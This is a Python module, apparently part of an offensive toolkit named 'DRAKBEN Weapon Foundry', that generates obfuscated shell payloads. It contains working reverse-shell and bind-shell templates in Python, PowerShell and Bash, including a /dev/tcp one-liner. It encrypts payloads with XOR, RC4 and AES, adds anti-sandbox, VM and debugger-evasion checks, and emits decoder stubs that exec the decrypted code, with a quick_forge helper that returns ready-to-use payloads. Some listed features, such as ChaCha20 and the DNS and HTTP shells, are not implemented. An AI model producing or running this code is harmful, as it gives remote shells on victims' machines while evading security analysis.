"""
DRAKBEN Weapon Foundry - Advanced Payload Generation & Encryption
Author: @drak_ben
Description: Dynamic payload generation with multiple encryption layers.

This module provides:
- Shellcode generation (pure Python/ASM)
- Multi-layer encryption (XOR, AES, RC4)
- Multiple output formats (exe, elf, dll, ps1, vbs, hta)
- Anti-sandbox checks
- Payload staging
"""

import base64
import hashlib
import logging
import os
import random
import string
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Union

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================

class PayloadFormat(Enum):
    """Supported payload output formats"""
    RAW = "raw"              # Raw shellcode bytes
    PYTHON = "python"        # Python script
    POWERSHELL = "ps1"       # PowerShell script
    VBS = "vbs"              # VBScript
    HTA = "hta"              # HTML Application
    BASH = "bash"            # Bash script
    C = "c"                  # C source code
    CSHARP = "csharp"        # C# source code


class EncryptionMethod(Enum):
    """Encryption methods for payloads"""
    NONE = "none"
    XOR = "xor"
    XOR_MULTI = "xor_multi"  # Multi-byte XOR key
    AES = "aes"              # AES-256-CBC
    RC4 = "rc4"
    CHACHA20 = "chacha20"


class ShellType(Enum):
    """Types of shell connections"""
    REVERSE_TCP = "reverse_tcp"
    BIND_TCP = "bind_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    DNS_TUNNEL = "dns_tunnel"
    DOMAIN_FRONTED = "domain_fronted"  # New - uses domain fronting


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    lhost: str = "127.0.0.1"
    lport: int = 4444
    shell_type: ShellType = ShellType.REVERSE_TCP
    format: PayloadFormat = PayloadFormat.RAW
    encryption: EncryptionMethod = EncryptionMethod.XOR
    encryption_key: Optional[bytes] = None
    iterations: int = 1  # Number of encryption layers
    anti_sandbox: bool = False
    anti_debug: bool = False
    sleep_seconds: int = 0  # Initial sleep before execution


@dataclass
class GeneratedPayload:
    """Result of payload generation"""
    payload: bytes
    format: PayloadFormat
    encryption: EncryptionMethod
    key: Optional[bytes]
    decoder_stub: str
    metadata: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# ENCRYPTION ENGINE
# =============================================================================

class EncryptionEngine:
    """
    Multi-method encryption engine for payload obfuscation.
    
    Supports:
    - Single and multi-byte XOR
    - AES-256-CBC (requires pycryptodome)
    - RC4 stream cipher
    - ChaCha20 (requires cryptography)
    """
    
    @staticmethod
    def generate_key(length: int = 16) -> bytes:
        """Generate random encryption key"""
        return os.urandom(length)
    
    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """
        XOR encrypt data with key.
        
        Args:
            data: Data to encrypt
            key: XOR key (can be single or multi-byte)
            
        Returns:
            Encrypted bytes
        """
        result = bytearray(len(data))
        key_len = len(key)
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % key_len]
        return bytes(result)
    
    @staticmethod
    def xor_decrypt(data: bytes, key: bytes) -> bytes:
        """XOR decrypt (same as encrypt - symmetric)"""
        return EncryptionEngine.xor_encrypt(data, key)
    
    @staticmethod
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        """
        RC4 stream cipher encryption/decryption.
        
        Args:
            data: Data to encrypt/decrypt
            key: RC4 key
            
        Returns:
            Encrypted/decrypted bytes
        """
        # RC4 Key Scheduling Algorithm (KSA)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # RC4 Pseudo-Random Generation Algorithm (PRGA)
        result = bytearray(len(data))
        i = j = 0
        for k, byte in enumerate(data):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = byte ^ S[(S[i] + S[j]) % 256]
        
        return bytes(result)
    
    @staticmethod
    def aes_encrypt(data: bytes, key: bytes, iv: Optional[bytes] = None) -> Tuple[bytes, bytes]:
        """
        AES-256-CBC encryption.
        
        Args:
            data: Data to encrypt
            key: 32-byte key (will be derived if shorter)
            iv: 16-byte IV (random if not provided)
            
        Returns:
            Tuple of (encrypted_data, iv)
        """
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
        except ImportError:
            logger.warning("pycryptodome not installed, falling back to XOR")
            return EncryptionEngine.xor_encrypt(data, key), b""
        
        # Derive 32-byte key if needed
        if len(key) < 32:
            key = hashlib.sha256(key).digest()
        else:
            key = key[:32]
        
        # Generate IV if not provided
        if iv is None:
            iv = os.urandom(16)
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        
        return encrypted, iv
    
    @staticmethod
    def aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
        """AES-256-CBC decryption"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
        except ImportError:
            return data
        
        if len(key) < 32:
            key = hashlib.sha256(key).digest()
        else:
            key = key[:32]
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(data), AES.block_size)
        
        return decrypted
    
    def encrypt(
        self, 
        data: bytes, 
        method: EncryptionMethod, 
        key: Optional[bytes] = None
    ) -> Tuple[bytes, bytes, Optional[bytes]]:
        """
        Encrypt data using specified method.
        
        Args:
            data: Data to encrypt
            method: Encryption method
            key: Encryption key (generated if None)
            
        Returns:
            Tuple of (encrypted_data, key, iv_or_none)
        """
        if method == EncryptionMethod.NONE:
            return data, b"", None
        
        if key is None:
            key = self.generate_key(16)
        
        if method == EncryptionMethod.XOR:
            encrypted = self.xor_encrypt(data, key[:1])  # Single byte
            return encrypted, key[:1], None
        
        elif method == EncryptionMethod.XOR_MULTI:
            encrypted = self.xor_encrypt(data, key)
            return encrypted, key, None
        
        elif method == EncryptionMethod.RC4:
            encrypted = self.rc4_crypt(data, key)
            return encrypted, key, None
        
        elif method == EncryptionMethod.AES:
            encrypted, iv = self.aes_encrypt(data, key)
            return encrypted, key, iv
        
        else:
            logger.warning(f"Unknown encryption method: {method}")
            return data, b"", None


# =============================================================================
# SHELLCODE TEMPLATES
# =============================================================================

class ShellcodeTemplates:
    """
    Pre-built shellcode templates for common operations.
    
    Note: These are encoded representations, not live shellcode.
    For actual operations, use with responsible disclosure.
    """
    
    # Template markers for dynamic replacement
    LHOST_MARKER = b"__LHOST__"
    LPORT_MARKER = b"__LPORT__"
    
    @staticmethod
    def get_reverse_shell_python(lhost: str, lport: int) -> str:
        """Generate Python reverse shell code"""
        return f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    
    @staticmethod
    def get_reverse_shell_powershell(lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell code"""
        return f'''
$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $r2=$r+"PS "+(pwd).Path+">";
    $sb=([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()
'''
    
    @staticmethod
    def get_reverse_shell_bash(lhost: str, lport: int) -> str:
        """Generate Bash reverse shell code"""
        return f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    
    @staticmethod
    def get_bind_shell_python(lport: int) -> str:
        """Generate Python bind shell code"""
        return f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{lport}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''


# =============================================================================
# ANTI-ANALYSIS TECHNIQUES
# =============================================================================

class AntiAnalysis:
    """
    Anti-sandbox and anti-debugging checks.
    
    Techniques:
    - Sleep acceleration detection
    - VM detection
    - Debugger detection
    - User interaction check
    """
    
    @staticmethod
    def get_sleep_check_python(seconds: int = 5) -> str:
        """Generate Python sleep acceleration check"""
        return f'''
import time
_s = time.time()
time.sleep({seconds})
if time.time() - _s < {seconds - 0.5}:
    import sys; sys.exit(0)
'''
    
    @staticmethod
    def get_vm_check_python() -> str:
        """Generate Python VM detection check"""
        return '''
import os,subprocess
def _vm():
    try:
        o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
        return o not in ["none",""]
    except: pass
    try:
        with open("/sys/class/dmi/id/product_name") as f:
            p=f.read().lower()
            for v in ["vmware","virtualbox","qemu","xen","kvm"]:
                if v in p: return True
    except: pass
    return False
if _vm(): import sys; sys.exit(0)
'''
    
    @staticmethod
    def get_debug_check_python() -> str:
        """Generate Python debugger detection check"""
        return '''
import sys
if sys.gettrace() is not None:
    sys.exit(0)
'''
    
    @staticmethod
    def get_user_check_python() -> str:
        """Generate Python user activity check"""
        return '''
import os
if "DISPLAY" not in os.environ and "SSH_TTY" not in os.environ:
    import sys; sys.exit(0)
'''


# =============================================================================
# DECODER STUB GENERATOR
# =============================================================================

class DecoderGenerator:
    """
    Generate decoder stubs for encrypted payloads.
    
    Creates minimal code to decrypt and execute payloads.
    """
    
    @staticmethod
    def get_xor_decoder_python(key: bytes) -> str:
        """Generate Python XOR decoder"""
        key_hex = key.hex()
        return f'''
import base64
def _d(d,k):
    return bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_d(_p,_k))
'''
    
    @staticmethod
    def get_rc4_decoder_python(key: bytes) -> str:
        """Generate Python RC4 decoder"""
        key_hex = key.hex()
        return f'''
import base64
def _rc4(d,k):
    S=list(range(256));j=0
    for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
    r=bytearray(len(d));i=j=0
    for n,b in enumerate(d):i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];r[n]=b^S[(S[i]+S[j])%256]
    return bytes(r)
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_rc4(_p,_k))
'''
    
    @staticmethod
    def get_xor_decoder_powershell(key: bytes) -> str:
        """Generate PowerShell XOR decoder"""
        key_int = key[0]
        return f'''
$k={key_int}
$d=[System.Convert]::FromBase64String($e)
$r=@()
for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
iex([System.Text.Encoding]::ASCII.GetString($r))
'''


# =============================================================================
# WEAPON FOUNDRY - MAIN CLASS
# =============================================================================

class WeaponFoundry:
    """
    Main interface for payload generation and weaponization.
    
    Features:
    - Dynamic payload generation
    - Multi-layer encryption
    - Multiple output formats
    - Anti-analysis integration
    - Decoder stub generation
    
    Usage:
        foundry = WeaponFoundry()
        payload = foundry.forge(
            shell_type=ShellType.REVERSE_TCP,
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.XOR,
            format=PayloadFormat.PYTHON
        )
    """
    
    def __init__(self):
        """Initialize Weapon Foundry"""
        self.encryption = EncryptionEngine()
        self.templates = ShellcodeTemplates()
        self.anti_analysis = AntiAnalysis()
        self.decoder = DecoderGenerator()
        
        logger.info("Weapon Foundry initialized")
    
    def forge(
        self,
        shell_type: ShellType = ShellType.REVERSE_TCP,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        encryption: EncryptionMethod = EncryptionMethod.XOR,
        format: PayloadFormat = PayloadFormat.PYTHON,
        iterations: int = 1,
        anti_sandbox: bool = False,
        anti_debug: bool = False,
        sleep_seconds: int = 0
    ) -> GeneratedPayload:
        """
        Forge a new payload with specified parameters.
        
        Args:
            shell_type: Type of shell connection
            lhost: Listener host
            lport: Listener port
            encryption: Encryption method
            format: Output format
            iterations: Number of encryption layers
            anti_sandbox: Add sandbox evasion
            anti_debug: Add debugger detection
            sleep_seconds: Initial sleep delay
            
        Returns:
            GeneratedPayload object
        """
        # Generate base payload
        base_payload = self._generate_base_payload(shell_type, lhost, lport, format)
        
        # Add anti-analysis if requested
        if anti_sandbox or anti_debug or sleep_seconds > 0:
            base_payload = self._add_anti_analysis(
                base_payload, format, anti_sandbox, anti_debug, sleep_seconds
            )
        
        # Encrypt payload
        payload_bytes = base_payload.encode('utf-8')
        key = None
        iv = None
        
        for _ in range(iterations):
            payload_bytes, key, iv = self.encryption.encrypt(
                payload_bytes, encryption, key
            )
        
        # IV is required for decryption but currently not embedded in the decoder stub
        # TODO: Pass IV to _generate_decoder or prepend to payload
        if iv:
            logger.debug(f"Encryption IV generated: {iv.hex() if iv else 'None'}")
        
        # Generate decoder stub
        decoder_stub = self._generate_decoder(encryption, key, format)
        
        return GeneratedPayload(
            payload=payload_bytes,
            format=format,
            encryption=encryption,
            key=key,
            decoder_stub=decoder_stub,
            metadata={
                "lhost": lhost,
                "lport": lport,
                "shell_type": shell_type.value,
                "iterations": iterations,
                "anti_sandbox": anti_sandbox,
                "anti_debug": anti_debug,
                "size": len(payload_bytes)
            }
        )
    
    def _generate_base_payload(
        self,
        shell_type: ShellType,
        lhost: str,
        lport: int,
        format: PayloadFormat
    ) -> str:
        """Generate base payload code"""
        if shell_type == ShellType.REVERSE_TCP:
            if format == PayloadFormat.PYTHON:
                return self.templates.get_reverse_shell_python(lhost, lport)
            elif format == PayloadFormat.POWERSHELL:
                return self.templates.get_reverse_shell_powershell(lhost, lport)
            elif format == PayloadFormat.BASH:
                return self.templates.get_reverse_shell_bash(lhost, lport)
        
        elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
             return self.templates.get_bind_shell_python(lport)
        
        # Default fallback
        return self.templates.get_reverse_shell_python(lhost, lport)
    
    def _add_anti_analysis(
        self,
        payload: str,
        format: PayloadFormat,
        anti_sandbox: bool,
        anti_debug: bool,
        sleep_seconds: int
    ) -> str:
        """Add anti-analysis checks to payload"""
        prefix = ""
        
        if format == PayloadFormat.PYTHON:
            if sleep_seconds > 0:
                prefix += self.anti_analysis.get_sleep_check_python(sleep_seconds)
            if anti_sandbox:
                prefix += self.anti_analysis.get_vm_check_python()
            if anti_debug:
                prefix += self.anti_analysis.get_debug_check_python()
        
        return prefix + payload
    
    def _generate_decoder(
        self, 
        encryption: EncryptionMethod, 
        key: bytes,
        format: PayloadFormat
    ) -> str:
        """Generate decoder stub for encrypted payload"""
        if encryption == EncryptionMethod.NONE:
            return ""
        
        if format == PayloadFormat.PYTHON:
            if encryption in (EncryptionMethod.XOR, EncryptionMethod.XOR_MULTI):
                return self.decoder.get_xor_decoder_python(key)
            elif encryption == EncryptionMethod.RC4:
                return self.decoder.get_rc4_decoder_python(key)
        
        elif format == PayloadFormat.POWERSHELL:
            if encryption == EncryptionMethod.XOR:
                return self.decoder.get_xor_decoder_powershell(key)
        
        return ""
    
    def get_final_payload(self, generated: GeneratedPayload) -> str:
        """
        Get final payload ready for delivery.
        
        Combines encrypted payload with decoder stub.
        
        Args:
            generated: GeneratedPayload from forge()
            
        Returns:
            Complete executable payload as string
        """
        encoded = base64.b64encode(generated.payload).decode()
        
        if generated.format == PayloadFormat.PYTHON:
            return f'_e="{encoded}"\n{generated.decoder_stub}'
        
        elif generated.format == PayloadFormat.POWERSHELL:
            return f'$e="{encoded}"\n{generated.decoder_stub}'
        
        elif generated.format == PayloadFormat.BASH:
            return f'echo "{encoded}" | base64 -d | bash'
        
        return encoded
    
    def list_capabilities(self) -> Dict[str, List[str]]:
        """List all available capabilities"""
        return {
            "shell_types": [s.value for s in ShellType],
            "formats": [f.value for f in PayloadFormat],
            "encryptions": [e.value for e in EncryptionMethod],
            "anti_analysis": ["sandbox_evasion", "debug_detection", "sleep_check", "vm_detection"]
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================

def get_weapon_foundry() -> WeaponFoundry:
    """
    Get singleton WeaponFoundry instance.
    
    Returns:
        WeaponFoundry instance
    """
    global _weapon_foundry
    if "_weapon_foundry" not in globals() or _weapon_foundry is None:
        _weapon_foundry = WeaponFoundry()
    return _weapon_foundry


def quick_forge(
    lhost: str,
    lport: int = 4444,
    encryption: str = "xor",
    format: str = "python"
) -> str:
    """
    Quick payload generation.
    
    Args:
        lhost: Listener host
        lport: Listener port
        encryption: Encryption method name
        format: Output format name
        
    Returns:
        Ready-to-use payload string
    """
    foundry = get_weapon_foundry()
    
    enc_method = EncryptionMethod(encryption)
    fmt = PayloadFormat(format)
    
    payload = foundry.forge(
        lhost=lhost,
        lport=lport,
        encryption=enc_method,
        format=fmt
    )
    
    return foundry.get_final_payload(payload)
